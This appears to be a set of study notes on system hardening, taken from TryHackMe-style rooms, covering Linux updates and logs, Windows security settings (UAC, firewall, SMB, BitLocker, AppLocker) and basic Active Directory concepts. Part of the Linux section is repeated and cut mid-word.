Calculating upgrade... Done
0 upgraded, 0 newly installed, 0 to remove and 0 not upgraded.

133 additional updates are available with UA Infrastructure ESM.
To see these additional updates run: apt list --upgradable
See https://ubuntu.com/advantage or run: sudo ua status
```

Ubuntu 14.04 was released more than five years ago; hence, free 
updates are no longer available. From the security point of view, the 
user should either get an Ubuntu Pro subscription or switch to a new LTS
 release, such as Ubuntu 22.04. Continuing to run a system that does not
 receive security updates exposes the system and the whole network to 
additional risk.

## RedHat Releases

RedHat Enterprise Linux 8 and 9 offer 12 years of support in three phases:

1. Full Support for five years
2. Maintenance Support for five years
3. Extended Life Phase for two years

For example, Red Hat Enterprise Linux 9 was released on May 18, 2022. It can benefit from updates as follows:

1. Full support till May 31, 2027
2. Maintenance support till May 31, 2032

For more details, check [Red Hat Enterprise Linux Life Cycle](https://access.redhat.com/support/policy/updates/errata/).

## Kernel Updates

Updating the system should not be limited to the installed software; 
it should consider updating the kernel. For instance, in 2016, a 
security vulnerability that affects the Linux kernel was discovered. It 
allows an attacker to gain root access to a system by exploiting a race 
condition in the copy-on-write (COW) mechanism, giving it the name 
“Dirty COW.” The vulnerability is present in all Linux kernel versions 
from 2.6.22 onwards. It has been patched in most major Linux 
distributions, but it is still a threat to systems that have not been 
updated.

Because Dirty COW is a severe vulnerability that can allow attackers 
to gain root access to Linux systems, it is crucial to keep your system,
 including its kernel, up-to-date with the latest security patches to 
reduce the risk of exploitation.

## Automatic Updates

Now that you have a Linux system with security updates throughout its
 life, we must ensure that the updates are properly installed, and 
security fixes are applied.

- Stay updated with security news in case of a vulnerability that affects your systems is disclosed.
- Depending on the Linux distribution that you are using, consider
configuring automatic updates. Automating updates on Linux distributions that prioritize stability over cutting-edge technology would be safe.

**Update and Upgrade Policies**

It is vital that you keep your system updated with the latest security patches and bug fixes.

You can update a Debian-based distribution, such as Ubuntu, with the following two commands:

1. `apt update` to download package information from the configured sources
2. `apt upgrade` to install available upgrades for all packages from the configured sources

You can update a RedHat or Fedora system using the following:

- `dnf update` on newer releases (Red Hat Enterprise Linux 8 and later)
- `yum update` on older releases (Red Hat Enterprise Linux 7 and earlier)

Since we are talking about production systems, we need to select 
distributions that will continue to receive updates smoothly for many 
years.

## Ubuntu LTS Releases

For example, Ubuntu releases a Long Term Support (LTS) version every 
two years. LTS releases have an even version number (indicating the 
year) with 04 (for April), such as 18.04, 20.04, and 22.04. An LTS 
version will grant you five years of security updates for the base OS 
without a subscription and another five years if you pay for Extended 
Security Maintenance (ESM). For more information, you might want to 
check [The Ubuntu lifecycle and release cadence](https://ubuntu.com/about/release-cycle).

Using an Ubuntu LTS release, you can download updates without a 
subscription for the first five years. Consider the following Linux 
system with Ubuntu 14.04. It was released in 2014, and its free support 
ended in April 2019. In other words, free update service was available 
till 2019. In the terminal below, we see that there are 133 additional 
updates that we can download and install if we have an Ubuntu Pro 
(Infra-Only) subscription (previously known as Ubuntu Advantage (UA) for
 Infrastructure).

AttackBox Terminal

```
root@AttackBox# user@tryhackme$ uname -aLinux ubuntu-14-vm 4.4.0-148-generic #174~14.04.1-Ubuntu SMP Thu May 9 08:18:11 UTC 2019 i686 athlon i686 GNU/Linuxuser@tryhackme$ sudo apt upgradeReading package lists... Done
Building dependency tree
Reading state information... Done
Calculating upgrade... Done
0 upgraded, 0 newly installed, 0 to remove and 0 not upgraded.

133 additional updates are available with UA Infrastructure ESM.
To see these additional updates run: apt list --upgradable
See https://ubuntu.com/advantage or run: sudo ua status
```

Ubuntu 14.04 was released more than five years ago; hence, free 
updates are no longer available. From the security point of view, the 
user should either get an Ubuntu Pro subscription or switch to a new LTS
 release, such as Ubuntu 22.04. Continuing to run a system that does not
 receive security updates exposes the system and the whole network to 
additional risk.

## RedHat Releases

RedHat Enterprise Linux 8 and 9 offer 12 years of support in three phases:

1. Full Support for five years
2. Maintenance Support for five years
3. Extended Life Phase for two years

For example, Red Hat Enterprise Linux 9 was released on May 18, 2022. It can benefit from updates as follows:

1. Full support till May 31, 2027
2. Maintenance support till May 31, 2032

For more details, check [Red Hat Enterprise Linux Life Cycle](https://access.redhat.com/support/policy/updates/errata/).

## Kernel Updates

Updating the system should not be limited to the installed software; 
it should consider updating the kernel. For instance, in 2016, a 
security vulnerability that affects the Linux kernel was discovered. It 
allows an attacker to gain root access to a system by exploiting a race 
condition in the copy-on-write (COW) mechanism, giving it the name 
“Dirty COW.” The vulnerability is present in all Linux kernel versions 
from 2.6.22 onwards. It has been patched in most major Linux 
distributions, but it is still a threat to systems that have not been 
updated.

Because Dirty COW is a severe vulnerability that can allow attackers 
to gain root access to Linux systems, it is crucial to keep your system,
 including its kernel, up-to-date with the latest security patches to 
reduce the risk of exploitation.

## Automatic Updates

Now that you have a Linux system with security updates throughout its
 life, we must ensure that the updates are properly installed, and 
security fixes are applied.

- Stay updated with security news in case of a vulnerability that affects your systems is disclosed.
- Depending on the Linux distribution that you are using, co

**Audit and Log Configuration**

Most log files on Linux systems are stored in the **`/var/log`** directory. Here are a few of the logs that can be referenced when looking into threats:

- `/var/log/messages` - a general log for Linux systems
- `/var/log/auth.log` - a log file that lists all authentication attempts (Debian-based systems)
- `/var/log/secure` - a log file that lists all authentication attempts (Red Hat and Fedora-based systems)
- `/var/log/utmp` - an access log that contains information regarding users that are currently logged into the system
- `/var/log/wtmp` - an access log that contains information for all users that have logged in and out of the system
- `/var/log/kern.log` - a log file containing messages from the kernel
- `/var/log/boot.log` - a log file that contains start-up messages and boot information

We will keep this task short and include only two handy commands for large log files.

- Since new events are appended to the log file, you can view the last few lines using `tail`. For example, `tail -n 12 boot.log` will display the last 12 lines.
- One way to search log lines containing a specific keyword is using the command `grep`. For instance, `grep FAILED boot.log` will only show the lines with the word `FAILED`.

Note that you must be logged in as root or precede your commands with `sudo` to view the system log files.

**Conclusion**

It is essential to follow some general guidelines. Most of them are 
common sense that a system administrator will develop after some 
experience. A minimal set of guidelines to adopt includes the following:

- Document host information.
- Apply and test the changes on a test system. Test before you make changes to production environments.
- Document all changes carried out.

The above guidelines can quickly extend over a few pages depending on the company size.

## **WINDOWS HARDENING**

**Understanding General Concepts**

Services

Windows
 Services create and manage critical functions such as network 
connectivity, storage, memory, sound, user credentials, and data backup 
and runs automatically in the background. These services are managed by 
the Service Control Manager panel and divided into three categories, 
i.e. Local, Network & System. Many applications like browsers and 
anti-virus software can also run their services for a seamless user 
experience.

Type `services.msc` in the Run window to access Windows services.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/62a7685ca6e7ce005d3f3afe/room-content/508f1714a93326335f11c9f9804582a2.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/62a7685ca6e7ce005d3f3afe/room-content/508f1714a93326335f11c9f9804582a2.png)

Windows Registry

The
 Windows registry is a unified container database that stores 
configurational settings, essential keys and shared preferences for 
Windows and third-party applications. Usually, on the installation of 
most applications, it uses a registry editor for storing various states 
of the application. For example, suppose an application (malicious or 
normal) wants to execute itself during the computer boot-up process; In 
that case, it will store its entry in the Run & Run Once key.

Usually,
 a malicious program makes undesired changes in the registry editor and 
tries to abuse its program or service as part of system routine 
activities. It is always recommended to protect the registry editor by 
limiting its access to unauthorised users.

Type `regedit` in the Run dialogue or taskbar search to access the registry editor.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/62a7685ca6e7ce005d3f3afe/room-content/f10675954519d7470106a15273aeaa7f.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/62a7685ca6e7ce005d3f3afe/room-content/f10675954519d7470106a15273aeaa7f.png)

Event Viewer

Event
 Viewer is an app that shows log details about all events occurring on 
your computer, including driver updates, hardware failures, changes in 
the operating system, invalid authentication attempts and application 
crash logs. Event Viewer receives notifications from different services 
and applications running on the computer and stores them in a 
centralised database.

Hackers and malicious actors access Event Viewer to increase their attack surface and enhance the target system's profiling. Event categories are as below:

- Application: Records events of already installed programs.
- System: Records events of system components.
- Security: Logs events related to security and authentication etc.

We can access Event Viewer by typing `eventvwr` in the Run window. The default location for storing events is `C:\WINDOWS\system32\config\folder` in the attached VM (`10.10.90.169`).

![https://tryhackme-images.s3.amazonaws.com/user-uploads/62a7685ca6e7ce005d3f3afe/room-content/3fb4825b43009e27d7217c49d2a54e77.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/62a7685ca6e7ce005d3f3afe/room-content/3fb4825b43009e27d7217c49d2a54e77.png)

Telemetry

Telemetry
 is a data collection system used by Microsoft to enhance the user 
experience by preemptively identifying security and functional issues in
 software. An application seamlessly shares data (crash logs, 
application-specific) with Microsoft to improve the user experience for 
future releases.

Telemetry functionality is achieved by Universal Telemetry Client (UTC) services available in Windows and runs through `diagtrack.dll`. Contents acquired through telemetry service are stored encrypted in a local folder `%ProgramData%\Microsoft\Diagnosis` and sent to Microsoft after 15 minutes or so.

We can access `The DiagTrack` through the Services console in Windows 10.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/62a7685ca6e7ce005d3f3afe/room-content/4798e8d5fcae725891dd0d917da72a71.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/62a7685ca6e7ce005d3f3afe/room-content/4798e8d5fcae725891dd0d917da72a71.png)

**Identity & Access Management**

**Standard vs Admin Account**

Identity
 and access management involves employing best practices to ensure that 
only authenticated and authorised users can access the system. There are
 two types of accounts in Windows, i.e. Admin and Standard Account. Per 
best practice, the Admin account should only be used to carry out tasks 
like software installation and accessing the registry editor, service 
panel, etc. Routine functions like access to regular applications, 
including Microsoft Office, browser, etc., can be allowed to standard 
accounts. Go to  `Control Panel > User Accounts`  to create standard or administrator accounts.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/62a7685ca6e7ce005d3f3afe/room-content/9a52c8c09ea562fc4003da40cc87a229.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/62a7685ca6e7ce005d3f3afe/room-content/9a52c8c09ea562fc4003da40cc87a229.png)

In either case, a user can authenticate themselves on the system through a **password**; however, Windows 10 has introduced a new feature called **Windows Hello**, which allows authenticating someone based on “something you have, something you know or something you are”.

To access accounts and select the sign-in option, go to

```
 Settings > Accounts > Sign-in Options.
```

![https://tryhackme-images.s3.amazonaws.com/user-uploads/62a7685ca6e7ce005d3f3afe/room-content/51fff821ccc3b7e21698a6160df4a96b.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/62a7685ca6e7ce005d3f3afe/room-content/51fff821ccc3b7e21698a6160df4a96b.png)

**User Account Control (UAC)**

User Account Control (UAC)
 is a feature that enforces enhanced access control and ensures that all
 services and applications execute in non-administrator accounts. It 
helps mitigate malware's impact and minimises privilege escalation by [bypassing UAC](https://tryhackme.com/room/bypassinguac).
 Actions requiring elevated privileges will automatically prompt for 
administrative user account credentials if the logged-in user does not 
already possess these.

For example, installing device drivers or allowing inbound connections through Windows Firewall requires more permissions than already available privileges for a standard user. We have covered the topic in detail in [Windows Fundamental 1](https://tryhackme.com/room/windowsfundamentals1xbx).

As a principle, always follow the **Principle of Least Privilege**, which states that (Per [CISA](https://www.cisa.gov/uscert/bsi/articles/knowledge/principles/least-privilege#:~:text=The%20Principle%20of%20Least%20Privilege%20states%20cthat%20a%20subject%20should,should%20not%20have%20that%20right)) “*a
 subject should be given only those privileges needed for it to complete
 its task. If a subject does not need an access right, the subject 
should not have that right*”.

To access UAC, go to  `Control Panel -> User Accounts`  and click on  `Change User Account Control Setting`.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/62a7685ca6e7ce005d3f3afe/room-content/5e5609be5a55c30aa42a27801c5362c4.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/62a7685ca6e7ce005d3f3afe/room-content/5e5609be5a55c30aa42a27801c5362c4.png)

Keep the notification level "**Always Notify**" in the User Account Control Settings.

**Local Policy and Group Policies Editor**

Group
 Policy Editor is a built-in interactive tool by Microsoft that allows 
to configure and implement local and group policies. We mainly use this 
feature when part of a network; however, we can also use it for a 
workstation to limit the execution of vulnerable extensions, set 
password policies, and other administrative settings.

**Note**: The feature is not available in Windows Home but only in the Pro and Enterprise versions.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/62a7685ca6e7ce005d3f3afe/room-content/e459dd6e94f893a5db56ba8c6d2ced94.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/62a7685ca6e7ce005d3f3afe/room-content/e459dd6e94f893a5db56ba8c6d2ced94.png)

**Password Policies**

One primary use of a local policy editor is to ensure complex and strong passwords for user accounts. For example, we can design password policies to maximise our security:

- Passwords must contain both uppercase and lowercase characters.
- Check passwords against leaked or already hacked databases or a dictionary of compromised passwords.
- In case of 6 failed login attempts within 15 minutes, the account will remain locked for at least 1 hour.

We can access Password policies through the Local group policy editor.

Go to  `Security settings > Account Policies > Password policy`

![https://tryhackme-images.s3.amazonaws.com/user-uploads/62a7685ca6e7ce005d3f3afe/room-content/e159d0daed7b8b8f217cbcd85d10c0b2.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/62a7685ca6e7ce005d3f3afe/room-content/e159d0daed7b8b8f217cbcd85d10c0b2.png)

**Setting A Lockout Policy**

To
 protect your system password from being guessed by an attacker, we can 
set out a lockout policy so the account will automatically lock after 
certain invalid attempts. To set a lockout policy, go to `Local Security Policy > Windows Settings > Account Policies > Account Lockout Policy` and configure values to lock out hackers after three invalid attempts.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/62a7685ca6e7ce005d3f3afe/room-content/b4364de2e962d48755d37d254dddf0f9.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/62a7685ca6e7ce005d3f3afe/room-content/b4364de2e962d48755d37d254dddf0f9.png)

**Network Management**

**Windows Defender Firewall**

Windows Defender Firewall
 is a built-in application that protects computers from malicious 
attacks and blocks unauthorised traffic through inbound and outbound 
rules or filters. As an analogy, this is equivalent to “who is coming in
 and going out of your home”.

Malicious actors abuse Windows Firewall
 by bypassing existing rules. For example, if we have configured the 
firewall to allow incoming connections, hackers will try to manipulate 
the functionality by creating a remote connection to the victim's 
computer.

You can see more details about Windows Firewall Configuration [here](https://tryhackme.com/room/redteamfirewalls).

We can access Windows Defender Firewall by accessing `WF.msc` in the Run dialogue.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/62a7685ca6e7ce005d3f3afe/room-content/0825e4e702f7d4c9e0b5c4df81878fe4.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/62a7685ca6e7ce005d3f3afe/room-content/0825e4e702f7d4c9e0b5c4df81878fe4.png)

As mentioned in the [Windows Fundamentals room](https://tryhackme.com/room/windowsfundamentals3xzx), it has three main profiles `Domain, Public and Private`.  The Private profile must be activated with "Blocked Incoming Connections" while using the computer at home.

View detailed settings for each profile by clicking on Windows Defender Firewall Properties.

Whenever possible, enable the Windows Defender Firewall
 default settings. For blocking all the incoming traffic, always 
configure the firewall with a 'default deny' rule before making an 
exception rule that allows more specific traffic.

**Disable unused Networking Devices**

Network
 devices like routers, ethernet cards, WiFI adapters etc., enable data 
sharing between computers. If the device is improperly configured or not
 being used by the owner, it is recommended to disable the interface so 
that threat actors cannot access them and use them for data retrieval 
from the victim's computer.

To disable the unused Networking Devices, go to the `Control panel > System and Security Setting > System > Device Manager` and disable all the unused Networking devices.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/62a7685ca6e7ce005d3f3afe/room-content/381409d62e6ebaf2c542849dc941f58c.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/62a7685ca6e7ce005d3f3afe/room-content/381409d62e6ebaf2c542849dc941f58c.png)

**Disable SMB protocol**

SMB

is a file-sharing protocol exploited by hackers in the wild. The 
protocol is primarily used for file sharing in a network; therefore, you
 must disable the protocol if your computer is not part of a network by 
issuing the

[following](https://docs.microsoft.com/en-us/windows-server/storage/file-server/troubleshoot/detect-enable-and-disable-smbv1-v2-v3)

command in

PowerShell

.

Administrator - Windows PowerShell

```
user@machine$ Disable-WindowsOptionalFeature -Online -FeatureName SMB1ProtocolPath          :
Online        : True
RestartNeeded : False
```

**Protecting Local Domain Name System (DNS)**

The domain name system (DNS)
 is a naming system that translates Fully Qualified Domain Names (FQDN) 
into IP addresses. If the attacker places himself in the middle, he may 
intercept and manipulate DNS requests and point them to 
attacker-controlled systems since DNS replies are neither authenticated 
nor encrypted.

The hosts file located in Windows acts like local DNS
 and is responsible for resolving hostnames to IP addresses. Malicious 
actors try to edit the file's content to reroute traffic to their 
command and control server.

The hosts file is located at `C:\Windows\System32\Drivers\etc\hosts`.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/62a7685ca6e7ce005d3f3afe/room-content/011d5a2f065508cd740f211aa7a478ad.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/62a7685ca6e7ce005d3f3afe/room-content/011d5a2f065508cd740f211aa7a478ad.png)

**Mitigating Address Resolution Protocol Attack**

The address resolution protocol resolves MAC
 addresses from given IP addresses saved in the workstations ARP cache. 
The ARP offers no authentication and accepts responses from any user in 
the network. An attacker can flood target systems with crafted ARP 
responses, which point to an attacker-controlled machine and put him in 
the middle of communication between the targeted hosts.

You can check ARP entries using the command **`arp -a`** in the command prompt.

Command Prompt

```
user@machine$ arp -aInterface: 192.168.231.2 --- 0x5
  Internet Address      Physical Address      Type
  192.168.231.255       ff-ff-ff-ff-ff-ff     static
  224.0.0.2             01-00-5e-00-00-02     static
  224.0.0.22            01-00-5e-00-00-16     static
  224.0.0.251           01-00-5e-00-00-fb     static
  224.0.0.252           01-00-5e-00-00-fc     static
  239.255.255.250       01-00-5e-7f-ff-fa     static

```

The table contains MAC
 addresses in the middle and IP addresses in the left.  If the table 
includes a MAC mapped to two IPs, you are probably susceptible to an ARP
 poisoning attack.

To clear the ARP cache and prevent the attack, issue the command `arp -d`.

**Preventing Remote Access to Machine**

Remote
 access provides a way to connect to other computers/networks even 
located at a different geographical location for file sharing and 
remotely make changes to a workstation. Microsoft has developed a Remote
 Desktop Protocol (RDP) for connecting with other computers. Hackers have exploited the protocol in the past, like the famous [Blue Keep vulnerability](https://en.wikipedia.org/wiki/BlueKeep), to gain unauthorised access to the target system.

We must disable remote access (if not required) by going to `settings > Remote Desktop`. Do not attempt this in VM attached to this room.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/62a7685ca6e7ce005d3f3afe/room-content/340bfd9d93e9a44e2f244fc1d2d302ea.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/62a7685ca6e7ce005d3f3afe/room-content/340bfd9d93e9a44e2f244fc1d2d302ea.png)

**Application Management**

**Trusted Application Store**

Microsoft
 Store offers a complete range of applications (games, utilities) and 
allows downloading non-malicious files through a single click. Malicious
 actors bind legitimate software with trojans and viruses and upload it 
on the internet to infect and access the victim's computer. Therefore, 
downloading applications from the Microsoft Store ensures that the 
downloaded software is not malicious.

We can access Microsoft Application Store by typing `ms-windows-store:` in the Run dialogue.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/62a7685ca6e7ce005d3f3afe/room-content/55413d1781c530e53fa175b3e2fadb84.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/62a7685ca6e7ce005d3f3afe/room-content/55413d1781c530e53fa175b3e2fadb84.png)

**Safe App Installation**

Only allow installation of applications from the Microsoft Store on your computer.

Go to `Setting > Select Apps and Features` and then select `The Microsoft Store only`.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/62a7685ca6e7ce005d3f3afe/room-content/adf2295862b9d01aec5d967aaa9c6433.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/62a7685ca6e7ce005d3f3afe/room-content/adf2295862b9d01aec5d967aaa9c6433.png)

**Malware Removal through Windows Defender Anti Virus**

Windows
 Defender Anti Virus is a complete anti-malware program capable of 
identifying malicious programs and taking remedial measures like 
quarantine. The program used to have an entire Graphical User Interface;
 however, Windows 10 and newer versions manage the same through Windows 
Security Centre. Windows Defender primarily offers four main 
functionalities:

- **Real-time protection** - Enables periodic scanning of the computer.
- **Browser integration** - Enables safe browsing by scanning all downloaded files, etc.
- **Application Guard** Allows complete web session sandboxing to block malicious websites or sessions to make changes in the computer.
- **Controlled Folder Access** - Protect memory areas and folders from unwanted applications.

You have already learned about this in [Windows Fundamentals 3](https://tryhackme.com/room/windowsfundamentals3xzx)

**Microsoft Office Hardening**

Microsoft
 Office Suite is one of the most widely used application suites in all 
sectors, including financial, telecom, education, etc. Malicious actors 
abuse its functionality through macros, Flash applets, object linking 
etc., to achieve Remote Code Execution.

Hardening of 
Microsoft Office may vary from person to person as legitimate 
functionality of Microsoft Office is exploited to gain access. For 
example, disabling macros in a University may be helpful as no one uses 
it; however, banks cannot disable macros as they heavily rely on complex
 invoices and formulas through macros.

The attached VM contains a batch file based on best practices and [Microsoft Attack Surface Reduction Rules](https://docs.microsoft.com/en-us/microsoft-365/security/defender-endpoint/attack-surface-reduction-rules-reference?view=o365-worldwide) for hardening Microsoft Office. To execute the script, right-click on the file office.bat on Desktop and Run as Administrator.

Command Prompt - Administrator

```
harden@tryhackme$ office.bat (Work in Progress)Microsoft Office Hardened Successfully.
```

**AppLocker**

AppLocker
 is a recently introduced feature that allows users to block specific 
executables, scripts, and installers from execution through a set of 
rules. We can easily configure them on a single PC or network through a 
GUI by the following method:

![https://tryhackme-images.s3.amazonaws.com/user-uploads/62a7685ca6e7ce005d3f3afe/room-content/7809f59c32041093a48fb49e3dea1891.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/62a7685ca6e7ce005d3f3afe/room-content/7809f59c32041093a48fb49e3dea1891.png)

Now, we will see how to add a rule through AppLocker to block a file based on its publisher name.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/62a7685ca6e7ce005d3f3afe/room-content/64f6885a19f1ea54250717a3af70efc0.gif](https://tryhackme-images.s3.amazonaws.com/user-uploads/62a7685ca6e7ce005d3f3afe/room-content/64f6885a19f1ea54250717a3af70efc0.gif)

**Browser (MS Edge)**

Microsoft
 Edge is a built-in browser available on Windows machines based on 
Chromium, inline with Google Chrome and Brave. The browser often acts as
 an entry point to a system for further pivoting and lateral movement. 
It is therefore of utmost importance to block and mitigate critical 
attacks carried out through a browser that include ransomware, ads, 
unsigned application downloads and trojans.

**Protecting the Browser through Microsoft Smart Screen**

Microsoft
 SmartScreen helps to protect you from phishing/malware sites and 
software when using Microsoft Edge. It helps to make informed decisions 
for downloads and lets you browse safely in Microsoft Edge by:

- Displaying an alert if you are visiting any suspicious web pages.
- Vetting downloads by checking their hash, signature etc against a malicious software database.
- Protecting against phishing and malicious sites by checking visited websites against a threat intelligence database.

To turn on the Smart Screen, go to `Settings > Windows Security > App and Browser Control > Reputation-based Protection`. Scroll down and turn on the `SmartScreen option`.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/62a7685ca6e7ce005d3f3afe/room-content/79b7490c1617095a385f943342d13176.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/62a7685ca6e7ce005d3f3afe/room-content/79b7490c1617095a385f943342d13176.png)

Open Microsoft Edge, go to Settings and then click “**Privacy, Search and Services**” - Set "**Tracking prevention**" to **Strict** to avoid tracking through ads, cookies etc.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/62a7685ca6e7ce005d3f3afe/room-content/b7e3bb52cc6ea640aa487f6124dcbb72.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/62a7685ca6e7ce005d3f3afe/room-content/b7e3bb52cc6ea640aa487f6124dcbb72.png)

**Storage Management**

**Data Encryption Through BitLocker**

Encryption
 of the computer is one of the most vital things to which we usually pay
 little attention. The worst nightmare is that someone gets unfettered 
access to your devices' data. Encryption ensures that you or someone you
 share the recovery key with can access the stored content.

Microsoft,
 for its business edition of Windows, utilises the encryption tools by 
BitLocker. Let us have a quick look at how one can ensure to protect the
 data through BitLocker encryption features available on the Home 
Editions of Windows 10. You have already read about it [here (Task 8)](https://tryhackme.com/room/windowsfundamentals3xzx).

Go to `Start > Control Panel > System and Security > BitLocker Drive Encryption`. You can easily see if the option to BitLocker Drive Encryption is enabled or not.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/62a7685ca6e7ce005d3f3afe/room-content/e36ecbbe7b00820e10c38199baa357c5.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/62a7685ca6e7ce005d3f3afe/room-content/e36ecbbe7b00820e10c38199baa357c5.png)

A
 trusted Platform Module chip TPM is one of the basic requirements to 
support BitLocker device encryption. Keeping the BitLocker recovery key 
in a secure place (preferably not on the same computer) is imperative. 
You can read more about BitLocker Recovery [here](https://support.microsoft.com/en-us/windows/finding-your-bitlocker-recovery-key-in-windows-6b71ad27-0b89-ea08-f143-056f5ab347d6).

**Note**: The BitLocker feature is not available in the attached VM.

**Windows Sandbox**

To run applications safely, we can use a temporary, isolated, lightweight desktop environment called Windows Sandbox. We
 can install software inside this safe environment, and this software 
will not be a part of our host machine, it will remain sandboxed. Once 
the Windows Sandbox is closed, everything, including files, software, 
and states will be deleted. We would require Virtualisation enabled on 
our OS to run this feature. We cannot try this in the attached VM but the steps for enabling the Sandbox feature are as below:

`Click Start > Search for 'Windows Features' and turn it on > Select Sandbox > Click OK to restart`

![https://tryhackme-images.s3.amazonaws.com/user-uploads/62a7685ca6e7ce005d3f3afe/room-content/42ad322953f66fdd2d911f331b54a49a.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/62a7685ca6e7ce005d3f3afe/room-content/42ad322953f66fdd2d911f331b54a49a.png)

If you want to close the Sandbox, click the `close button,` and it will disappear. Opening suspicious files in a Windows Sandbox before blindly executing them in your base OS is recommended.

**Windows Secure Boot**

Secure
 boot – an advanced security standard - checks that your system is 
running on trusted hardware and firmware before booting, which ensures 
that your system boots up safely while preventing unauthorised software access from taking control of your PC, like malware.

You are already in a secure boot environment if you run a modern PC with Unified Extensible Firmware Interface UEFI (the best replacement for BIOS) or Windows 10. You can check the status of the secure boot by following:

![https://tryhackme-images.s3.amazonaws.com/user-uploads/62a7685ca6e7ce005d3f3afe/room-content/7e86a928fcad06fc3a30d1e69620fa45.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/62a7685ca6e7ce005d3f3afe/room-content/7e86a928fcad06fc3a30d1e69620fa45.png)

The
 incredible thing is that you do not need to enable or install it as it 
works silently in the background. Windows allows you to disable these 
features, which is not recommended.  You can enable [Secure boot from BIOS settings](https://docs.microsoft.com/en-us/windows-hardware/manufacture/desktop/disabling-secure-boot?view=windows-11) (if disabled).

**Enable File Backups**

The
 last option, but certainly not the least important one to prevent 
losing irreplaceable and critical files is to enable file backups.
 Despite all the above techniques, if you somehow lose essential 
data/files, you can recover the loss by restoring it, if you have a file
 backup option. Creating file backups is the best option to
 avoid disasters like malware attacks or hardware failure. You can 
enable the file backup option through  `Settings > Update and Security > Backup`:-

![https://tryhackme-images.s3.amazonaws.com/user-uploads/62a7685ca6e7ce005d3f3afe/room-content/c2e8a9441b14db952c6771518efd047f.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/62a7685ca6e7ce005d3f3afe/room-content/c2e8a9441b14db952c6771518efd047f.png)

Therefore, the most convenient option is enabling it from the '`File History`' option - a built-in functionality of Windows 10 and 11.

**Updating Windows**

Hackers are 
continuously bypassing and exploiting Windows' legitimate features. You 
can see a list of Windows vulnerabilities by following [this](https://www.cvedetails.com/vulnerability-list/vendor_id-26/product_id-32238/Microsoft-Windows-10.html) link. The most critical part of hardening computers is enabling the Windows auto-updates.

`Click Start > Settings > Update & Security > Window Updates.`

This
 ensures that all the urgent security updates, if any, are installed 
immediately without causing any delay. It is most important because the 
quicker you apply the new Windows protection patch, the faster you can 
fix the potential vulnerabilities – to ensure the security from the 
latest known threats.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/62a7685ca6e7ce005d3f3afe/room-content/ca26fa3afcbabf99ce1d98b0396659c6.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/62a7685ca6e7ce005d3f3afe/room-content/ca26fa3afcbabf99ce1d98b0396659c6.png)

Remember,
 users who run the older Windows versions are always at greater risk and
 vulnerable to new security threats. So, be very careful about this.

## **ACTIVE DIRECTORY HARDENING**

**Understanding General Active Directory Concepts**

# Domain

The
 domain acts as a core unit regarding the logical structure of the 
Active Directory. It initially stores all the critical information about
 the objects that belong to the domain only.

# Domain Controller

A
 Domain Controller is an Active Directory server that acts as the brain 
for a Windows server domain; it supervises the entire network. Within 
the domain, it acts as a gatekeeper for users' authentication and IT 
resources authorisation.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/62a7685ca6e7ce005d3f3afe/room-content/5ab4122479fa8a405c4664b5e48acb74.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/62a7685ca6e7ce005d3f3afe/room-content/5ab4122479fa8a405c4664b5e48acb74.png)

**Trees and Forests**

Trees and Forests are the two most critical concepts of the Active Directory.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/62a7685ca6e7ce005d3f3afe/room-content/9ad6a5a237ae9a0afecbb75cb9884f25.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/62a7685ca6e7ce005d3f3afe/room-content/9ad6a5a237ae9a0afecbb75cb9884f25.png)

**Trees**

Trees
 are responsible for sharing resources between the domains. The 
communication between the domains inside a tree is possible by either 
one-way or two-way trust. When a domain is added to the Tree, it becomes
 the Offspring domain of that particular domain to which it is added – 
now a Parent domain.

# Forests

When the sharing of the standard global catalogue, directory schema, logical structure, and directory
configuration between the collections of trees is made successfully, it is
called a Forest. Communication between two forests becomes possible once a forest-level trust is created.

**Trust in Active Directory**

AD
 trust is the established communication bridge between the domains in 
Active Directory. When we say one domain trusts another in the AD 
network, it means its resources can be shared with another domain. 
However, one domain's resources are not directly available to every 
other domain, as it is not safe. Thus, the resource sharing availability
 is governed by Trusts in AD. The AD trusts are of two categories, which
 are classified based on their characteristics or the current direction.

